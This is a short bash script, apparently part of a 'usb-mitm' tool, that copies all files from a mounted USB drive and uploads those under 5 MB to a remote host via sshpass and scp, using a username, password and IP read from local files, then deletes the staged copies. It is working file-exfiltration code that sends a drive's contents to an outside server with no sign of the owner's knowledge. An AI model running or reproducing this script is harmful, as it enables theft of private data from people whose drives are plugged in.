#!/bin/bash
password=$(</home/ubuntu/usb-mitm/password.txt)
username=$(</home/ubuntu/usb-mitm/username.txt)
IP=$(</home/ubuntu/usb-mitm/IP.txt)
maxSize=5000000

mkdir -p /file_holder
for FILE in /mnt/mydrive/*; do
    cp "$FILE" /file_holder
done

IFS=$'\n'
for FILE in $(ls -S /file_holder/*); do
    fileSize=$(wc -c "$FILE" | awk '{print $1}')
    if [[ $fileSize -lt $maxSize ]] 
    then
        sshpass -p "$password" scp "$FILE" "$username"@"$IP":~/files
        rm -rf "$FILE"
fi
done